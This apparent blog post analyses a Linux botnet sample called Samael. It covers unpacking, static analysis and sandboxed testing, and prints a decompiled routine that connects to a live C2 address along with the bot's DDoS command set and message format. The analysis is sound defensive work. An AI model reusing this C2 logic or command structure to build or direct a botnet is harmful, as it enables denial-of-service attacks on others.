    <h2>Investigating Linux Botnet Malware<br>for Fun and no Profit</h2>
        <pre>
//======================================================================\\
        </pre>
<div class="blogmain_wide">
The other day, I obtained a malware sample which wasn't labeled, except that
it is an ELF x86_64. I was curious and decided to investigate. 
In this blog post I summarize my findings. 
<br><br>

First, the <emph>hash</emph> and the output of the <emph>file</emph> command.
<div class="blogbox_wide">
<pre>
-- SHA256:
061440ab984f239b28629ea346d516114705dac4f20f44a5700000f31cdcd00d
-- File Command: 
ELF 64-bit LSB executable, x86-64, version 1 (SYSV), 
statically linked, no section header
</pre>
</div>
<br><br>
The "no section header" part had me suspecting this sample is 
packed. A closer look with DetectItEasy reveals <emph>UPX</emph> was used as a packer
on the executable. Using upx -d, I was able to unpack the elf without any problems. 
Thus, this sample is packed with a non-modified version of UPX, without any modifications 
to the packed executable. After this, another look with <emph>file</emph> shows that the elf is stripped, 
the entropy of the file suggests no further encrypted / packed parts. Now to the insides.
<br><br>

I used IDA 7.6 for static analysis. The stripping makes reverse engineering harder, but not impossible. 
<br><br>

A first routine establishes a TCP listener on port 6969. A socket is created, which is then used with the 
bind system call. If bind fails, the bot closes itself. As no further functions use the TCP listener in any way,
I suspect this just ensures the bot is only running once.

In the next routine that is called, the connection establishment to the C2 follows, which is shown below.

<center>
<img src="imgs/sam_00.PNG" alt=":/">
</center>

Summarized, this image shows the creation of a TCP socket to connect to the IP <emph>23[.]94[.]179[.]104, port 1337</emph>.
Following this, the malware writes to a file named <emph>infected.log</emph>. The string written is:
<br><br>
<div class="blogbox_wide">
<pre>
This Device Has Been Infected by Samael Botnet Made By ur0a :)
</pre>
</div>
<br>
This is interesting, as a quick search reveals a youtube channel of this individual presenting the botnet,
as well as an instagram and discord account supplied in the description of the video ... The video claims the 
botnet is for "educational purposes only". <br><br> 

Connecting to the C2 IP with the Tor Browser leads to a web server, containing the malware for various architectures.
<center>
<img src="imgs/c2_web_00.PNG" alt=":/">
</center>

<br></br>

The C2 connection routine is shown in the listing below, decompiled with IDA and annotated by me. 
Here, the "int argc, char **argv..." parameters are a misinterpretation of IDA. The buffer, which is sent
in the last line before the return, is the name of the bot, supplied as an argument to the 
botnet program, if no name is supplied, the botname is set to the hard-coded string <emph>unknown</emph>.
This routine may be called multiple times, when the connection to the C2 is lost, also when 
attempting a reconnection after a disconnect from the C2.<br><br>

<div class="blogbox_wide">
<pre>
int __cdecl init_routine(int argc, const char **argv, ...)
{
  --- SNIP ---
  sockfd = s_socket(2LL, 1LL, 0LL);
  v8[0] = 2;
  v8[1] = s_htons(1337);
  v9 = s_gethostbyname("23.94.179.104");
  if ( (unsigned int)s_connect((unsigned int)sockfd, v8, 16LL) == -1 )
    return 0;
  sub_400C9C("Connection successful");
  fp = s_fopen("infected.log", "a+");
  s_fprintf("This Device Has Been Infected by Samael \
    Botnet Made By ur0a :)\r\n", 1LL, 64LL, fp);
  s_fclose(fp);
  sus_connected_to_c2 = 1;
  s_send(sockfd, (unsigned int)"%s", argc, v3, v4, v5);
  return 1;
}
</pre>
</div>
<br>

After a connection to the C2 is established, the bot waits for commands. There are 
four commands in total: <emph>STD, TCP, UDP, B0TK1ll</emph>, with B0TK1ll shutting 
down the bot. I will explain the other options in more detail next.<br><br>

<emph>STD</emph> creates a datagram socket, not specifiying a protocol (PF_UNSPEC). <br> 
<emph>UDP</emph> creates a raw socket, specifiying UDP as a protocol. <br> 
<emph>TCP</emph> creates a raw socket, specifying TCP as a protocol. <br>
<br>

The message sent to the bots starting an attack has the following format:

<emph>[METHOD][TargetIP][Target Port][Duration][Payload Size]</emph>. <br><br>

For dynamic analysis, I set the IP of my analysis machine to the C2 IP address
and connected to it from a second machine running the botnet malware. Contained 
in my private network, I was able to safely test the botnet. <br><br>

Each of these floods carried out by the bot seem to contain the 
payload string <emph>Samael-DDoS-Attack</emph>, at least as far as i was able to see
from the static analysis, however in my tests I was not able 
to observe this. Instead, all I saw was the same seemingly random string. Also, only the STD option
seems to work as intended, the UDP and TCP options do not seem to recognize the port 
supplied to the botnet via the C2 correctly.
<br>
<br>

When I connected to the webserver a couple days later, the files were gone :-0
